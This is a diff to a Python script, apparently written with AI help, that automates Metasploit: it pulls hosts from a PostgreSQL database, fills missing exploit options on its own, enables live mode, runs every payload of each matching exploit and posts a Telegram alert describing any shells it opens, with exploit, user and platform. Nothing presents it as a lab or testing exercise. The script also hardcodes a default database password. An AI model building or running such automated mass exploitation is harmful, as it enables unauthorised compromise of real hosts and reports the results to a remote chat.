@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 # corrige par code copilot
 import os
+import html
 import psutil
 import time
 import socket
 import subprocess
 import psycopg2
+import requests
+from pathlib import Path
 from pymetasploit3.msfrpc import MsfRpcClient
 
 # Récupération sécurisée des credentials PostgreSQL
@@ -14,7 +17,53 @@ PG_PASSWORD = os.getenv("PG_PASSWORD", "bojemoi")  # Ne pas mettre de valeur par
 PG_DBNAME = os.getenv("PG_DBNAME", "msf")
 PG_HOST = "postgres"
 
-MODE_RUN = 0
+MODE_RUN = 1
+
+
+def read_secret(name: str) -> str | None:
+    p = Path(f"/run/secrets/{name}")
+    if p.exists():
+        return p.read_text().strip()
+    return os.getenv(name.upper())
+
+
+def send_telegram_alert(sessions: dict, host: str) -> None:
+    token = read_secret("telegram_bot_token")
+    chat_id = read_secret("telegram_alert_chat_id")
+    if not token or not chat_id:
+        print("[WARN] Secrets Telegram non disponibles, alerte ignorée.")
+        return
+
+    lines = [f"💥 <b>UZI — Session ouverte sur {html.escape(host)}</b>"]
+    for sid, info in sessions.items():
+        via = html.escape(info.get("via_exploit", "?"))
+        payload = html.escape(info.get("via_payload", "?"))
+        stype = html.escape(info.get("type", "?"))
+        user = html.escape(info.get("username", "?"))
+        platform = html.escape(info.get("platform", "?"))
+        lines.append(
+            f"\n🔑 Session #{sid}\n"
+            f"  Type     : {stype}\n"
+            f"  Exploit  : {via}\n"
+            f"  Payload  : {payload}\n"
+            f"  Platform : {platform}\n"
+            f"  User     : {user}"
+        )
+
+    text = "\n".join(lines)
+    try:
+        resp = requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage",
+            json={"chat_id": int(chat_id), "text": text, "parse_mode": "HTML",
+                  "disable_web_page_preview": True},
+            timeout=15,
+        )
+        if resp.status_code == 200:
+            print(f"[INFO] Alerte Telegram envoyée ({len(sessions)} session(s)).")
+        else:
+            print(f"[WARN] Telegram API {resp.status_code}: {resp.text}")
+    except Exception as e:
+        print(f"[ERREUR] Envoi Telegram échoué : {e}")
 
 # Récupérer l'adresse IP du serveur PostgreSQL
 def get_postgres_ip():
@@ -127,9 +176,9 @@ def main():
 
         exploit.target = 0
         payload = exploit.targetpayloads()
-        print (f"missing required : {exploit.missing_required}")
         missing  =  exploit.missing_required
         if (len(missing) > 0):
+          active_sessions = client.sessions.list
           for index1 in range(0, len(missing)):
             match missing[index1]:
                case "RHOSTS":
@@ -137,16 +186,23 @@ def main():
                case "TARGET_PATH":
                     exploit[missing[index1]] = "/"
                case "SESSION":
-                    exploit[missing[index1]] = 1 
+                    if active_sessions:
+                        exploit[missing[index1]] = next(iter(active_sessions))
+                    else:
+                        print(f"[SKIP] SESSION requise mais aucune session active")
                case "LHOST":
-                    exploit[missing[index1]] = "1.1.1.1" 
+                    exploit[missing[index1]] = "1.1.1.1"
                case _:
                     print (f"Pas traite {missing[index1]}")
+        if exploit.missing_required:
+            print(f"[SKIP] Champs manquants : {exploit.missing_required} — {search_results[index]['fullname']}")
+            continue
+        print (f"missing résolus : {search_results[index]['fullname']}")
 
 #        print (exploit.runoptions)
 #        print (f" payload {payload}")
         if (len (payload) > 0):
-          if ( MODE_RUN == "1" ):
+          if ( MODE_RUN == 1 ):
             for index1 in range(0, len(payload)):
               print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
               try:
@@ -155,24 +211,28 @@ def main():
               except:
                   print (": A controler")
                   continue
+              while console.is_busy():
+                   print("+",end="")
+                   time.sleep(1)
           else:
+            for index1 in range(0, len(payload)):
               print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
               try:
-                  console.run_module_with_output(exploit)
+                  console.run_module_with_output(exploit, payload[index1])
                   print (": Ok")
               except:
                   print (": A controler")
                   continue
-
-
-        while console.is_busy():
-             print("+",end="")
-             time.sleep(1)
+              while console.is_busy():
+                   print("+",end="")
+                   time.sleep(1)
 
      print(f"[INFO] Scan de {host} terminé.")
 
      sessions = client.sessions.list
      print(f"[INFO] Sessions actives: {sessions}")
+     if sessions:
+         send_telegram_alert(sessions, host)
 
 
 if __name__ == "__main__":
